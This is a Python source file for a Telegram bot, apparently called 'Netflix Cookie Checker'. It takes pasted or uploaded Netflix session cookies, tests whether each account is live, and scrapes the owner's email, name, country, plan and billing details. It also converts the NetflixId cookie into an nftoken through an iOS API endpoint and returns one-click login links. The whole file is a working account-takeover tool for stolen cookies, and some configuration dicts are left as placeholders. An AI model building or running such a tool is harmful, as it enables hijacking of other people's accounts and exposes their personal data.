import re
import json
import requests
import urllib3
import urllib.parse
import os
from datetime import datetime
import telebot
from telebot import types

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ================== BOT TOKEN ==================
BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"   # ← CHANGE THIS
bot = telebot.TeleBot(BOT_TOKEN)

# ================== HELPERS ==================
def _djs(s):
    if not s: return ""
    s = re.sub(r'\\x([0-9a-fA-F]{2})', lambda m: chr(int(m.group(1), 16)), s)
    s = re.sub(r'\\u([0-9a-fA-F]{4})', lambda m: chr(int(m.group(1), 16)), s)
    return s.strip()

def _rx(pattern, text, default=""):
    m = re.search(pattern, text, re.S)
    return m.group(1) if m else default

def _rx_all(pattern, text):
    return re.findall(pattern, text, re.S)

def load_cookies(text):
    text = text.strip()
    if not text: return {}

    # JSON
    try:
        data = json.loads(text)
        if isinstance(data, list):
            return {c["name"]: c["value"] for c in data if "name" in c and "value" in c}
        if isinstance(data, dict):
            return data
    except: pass

    # Extract NetflixId from long paste
    cookies = {}
    match = re.search(r'NetflixId=([^;,\s"]+)', text)
    if match:
        cookies["NetflixId"] = match.group(1)

    for part in re.split(r"[;\n]", text):
        part = part.strip()
        if "=" in part:
            k, _, v = part.partition("=")
            k = k.strip()
            v = v.strip()
            if k and v:
                cookies[k] = v
    return cookies

# ================== NETFLIX FUNCTIONS ==================
_IOS_API = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
_IOS_PARAMS = { ... }  # (same as your original)

_IOS_HEADERS = { ... } # (same as your original - copy full dict)

UA_WEB = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"

COUNTRY_FLAGS = { ... }   # Copy from your original
COUNTRY_NAMES = { ... }   # Copy from your original

def generate_nftoken(netflix_id_raw, timeout=20):
    if not netflix_id_raw: return None
    netflix_id = urllib.parse.unquote(str(netflix_id_raw))
    headers = dict(_IOS_HEADERS)
    headers["Cookie"] = f"NetflixId={netflix_id}"

    try:
        r = requests.get(_IOS_API, params=_IOS_PARAMS, headers=headers, timeout=timeout, verify=False)
        if r.status_code == 200:
            data = r.json()
            token_data = (((data.get("value") or {}).get("account") or {}).get("token") or {}).get("default") or {}
            tok = token_data.get("token")
            if tok: return str(tok)
    except: pass
    return None

def check_account(cookies: dict, timeout=25):
    if not any(cookies.get(k) for k in ["NetflixId", "SecureNetflixId"]):
        return None

    sess = requests.Session()
    sess.headers.update({"User-Agent": UA_WEB})
    for k, v in cookies.items():
        sess.cookies.set(k, str(v), domain=".netflix.com", path="/")

    try:
        r = sess.get("https://www.netflix.com/account", timeout=timeout, allow_redirects=True)
    except:
        return None

    if "login" in r.url.lower() or r.status_code in (401, 403):
        return None

    html = r.text
    if '"membershipStatus":"CURRENT_MEMBER"' not in html:
        return None

    # Full parsing from your original code
    email = _djs(_rx(r'"emailAddress":"([^"]+)"', html))
    name = _djs(_rx(r'"userInfo":\{"name":"([^"]+)"', html)) or _djs(_rx(r'"firstName":"([^"]+)"', html))
    cc = _rx(r'"countryOfSignup":"([A-Z]{2,3})"', html, "XX")

    plan = _djs(_rx(r'"localizedPlanName":\{"fieldType":"String","value":"([^"]+)"\}', html))
    price = _djs(_rx(r'"planPrice":\{"fieldType":"String","value":"([^"]+)"\}', html))
    since = _djs(_rx(r'"memberSince":"([^"]+)"', html))
    nextbill = _djs(_rx(r'"nextBillingDate":\{"fieldType":"String","value":"([^"]+)"\}', html))
    quality = _rx(r'"videoQuality":\{"fieldType":"String","value":"([^"]+)"\}', html).upper()

    netflix_id_raw = cookies.get("NetflixId", "")
    tok = generate_nftoken(netflix_id_raw, timeout)

    if tok:
        tok_safe = urllib.parse.quote(tok, safe="")
        login_pc = f"https://netflix.com/?nftoken={tok_safe}"
        login_phone = f"https://netflix.com/unsupported?nftoken={tok_safe}"
    else:
        login_pc = login_phone = "N/A"

    return {
        "email": email or "N/A",
        "name": name or "N/A",
        "country_code": cc,
        "country": COUNTRY_NAMES.get(cc.upper(), cc),
        "plan": plan or "Premium",
        "price": price or "N/A",
        "member_since": since or "N/A",
        "next_billing": nextbill or "N/A",
        "video_quality": quality or "N/A",
        "login_pc": login_pc,
        "login_phone": login_phone,
        "login_tv": "https://www.netflix.com/tv2"
    }

# ================== BOT ==================
@bot.message_handler(commands=['start'])
def start(message):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add("🔍 Check Cookie")
    bot.send_message(message.chat.id, 
        "👋 <b>Netflix Cookie Checker</b>\n\nPaste cookie or send .txt file", 
        parse_mode="HTML", reply_markup=markup)

@bot.message_handler(content_types=['text'])
def handle_text(message):
    if message.text == "🔍 Check Cookie":
        bot.send_message(message.chat.id, "📤 Paste your full cookie:")
        return

    cookies = load_cookies(message.text)
    if not cookies:
        bot.reply_to(message, "❌ No NetflixId found.")
        return
    process_cookie(message, cookies)

@bot.message_handler(content_types=['document'])
def handle_document(message):
    try:
        file_info = bot.get_file(message.document.file_id)
        text = bot.download_file(file_info.file_path).decode('utf-8', errors='ignore')
        cookies = load_cookies(text)
        if not cookies:
            bot.reply_to(message, "❌ Could not parse file.")
            return
        process_cookie(message, cookies, message.document.file_name)
    except Exception as e:
        bot.reply_to(message, f"Error: {str(e)}")

def process_cookie(message, cookies, source="Pasted"):
    bot.send_chat_action(message.chat.id, 'typing')
    result = check_account(cookies)

    if not result:
        bot.reply_to(message, "❌ Invalid or expired cookie.")
        return

    text = f"""
🎬 <b>✅ NETFLIX VALID ACCOUNT</b>

👤 <b>{result['name']}</b>
📧 <code>{result['email']}</code>
🌍 {result['country']} ({result['country_code']})

📋 <b>{result['plan']}</b> • 💰 {result['price']}
📅 Since: {result['member_since']}
🗓 Next: {result['next_billing']}
🎥 Quality: {result['video_quality']}
    """

    markup = types.InlineKeyboardMarkup()
    if result["login_pc"] != "N/A":
        markup.add(types.InlineKeyboardButton("🖥 PC Login (NFT)", url=result["login_pc"]))
    if result["login_phone"] != "N/A":
        markup.add(types.InlineKeyboardButton("📱 Phone Login (NFT)", url=result["login_phone"]))
    markup.add(types.InlineKeyboardButton("📺 TV Login", url=result["login_tv"]))

    bot.send_message(message.chat.id, text, parse_mode="HTML", reply_markup=markup)

print("🚀 Bot Started...")
bot.infinity_polling()
